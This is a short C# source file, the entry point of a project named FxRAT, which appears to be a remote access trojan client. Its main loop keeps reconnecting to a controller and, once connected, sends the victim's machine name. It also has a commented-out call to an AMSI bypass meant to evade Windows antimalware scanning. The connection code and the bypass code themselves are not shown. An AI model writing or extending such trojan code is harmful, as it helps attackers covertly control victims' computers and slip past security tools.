using FxRAT.Utils;

namespace FxRAT;

class Program
{
    static void Main()
    {

        Connection connection = new Connection();
        
        //new AMSI().bypass();


        while (true)
        {
            if (!connection.isConnected)
            {
                Console.WriteLine("Attempting Connection");
                connection.InitClient();
            }

            else
            {
                Console.WriteLine("Connected");
                connection.WriteClient(Environment.MachineName);
            }
        }

    }
}

